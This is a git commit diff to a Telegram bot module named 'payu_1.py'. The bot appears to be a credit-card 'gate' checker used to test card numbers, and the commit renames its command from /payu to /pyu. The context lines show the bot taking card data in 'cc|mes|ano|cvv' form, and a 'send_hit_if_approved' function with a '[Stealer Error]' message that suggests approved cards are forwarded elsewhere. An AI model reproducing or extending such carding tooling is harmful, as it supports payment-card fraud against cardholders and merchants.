61ec25678f0ae802afe95204db4f3f0765a1b346
spxlau <buoyspilux@gmail.com>
2026-04-03 22:01:10 +0300

    Update payu_1.py

--- BOT/newgates/payu_1.py
+++ BOT/newgates/payu_1.py
@@ -22,7 +22,7 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("payu", [".", "/"]))
+@Client.on_message(filters.command("pyu", [".", "/"]))
 async def payu_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
@@ -37,7 +37,7 @@ async def payu_cmd(Client, message):
         role = checkall[1]
         getcc = await getmessage(message)
         if getcc == False:
-            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /payu\n\nMessage: No CC Found in your input ❌\n\nUsage: /payu cc|mes|ano|cvv</b>"""
+            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /pyu\n\nMessage: No CC Found in your input ❌\n\nUsage: /payu cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
